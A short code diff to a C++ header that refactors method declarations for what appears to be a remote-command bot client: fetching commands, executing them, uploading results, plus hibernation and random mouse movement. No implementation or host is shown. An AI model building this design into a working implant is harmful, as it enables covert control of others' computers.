@@ -59,10 +59,11 @@ public:
     void Hibernation();
 
     void RandMouse();
-    std::vector<std::string> getCommands(const char *serverAddress, const char *port);
+
+    std::vector<std::string> getCommands();
     std::string executeCommand(std::string command);
 
-    void uploadCommandsResponse(std::string, const char *serverAddress, const char *port);
+    void uploadCommandsResponse(std::string);
 
 };
 
